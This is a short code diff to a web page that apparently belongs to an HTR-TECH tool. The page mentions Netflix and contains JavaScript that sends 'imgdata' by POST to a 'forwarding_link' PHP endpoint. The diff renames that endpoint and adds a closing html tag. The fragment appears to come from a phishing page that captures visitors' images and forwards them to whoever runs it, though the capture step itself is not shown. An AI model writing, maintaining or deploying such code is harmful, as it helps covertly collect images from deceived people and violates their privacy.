@@ -21,7 +21,7 @@ function post(imgdata){
 $.ajax({
     type: 'POST',
     data: { cat: imgdata},
-    url: 'forwarding_link/.htrtech.php',
+    url: 'forwarding_link/post.php',
     dataType: 'json',
     async: false,
     success: function(result){
@@ -111,3 +111,4 @@ At the moment,&nbsp;<span style="box-sizing: inherit; font-weight: 700;">Netflix
 <span style="color: red;"><b><br /></b></span></div>
 <div style="text-align: right;">
 <span style="color: red;"><b>Copyright by HTR-TECH</b></span></div>
+</html>
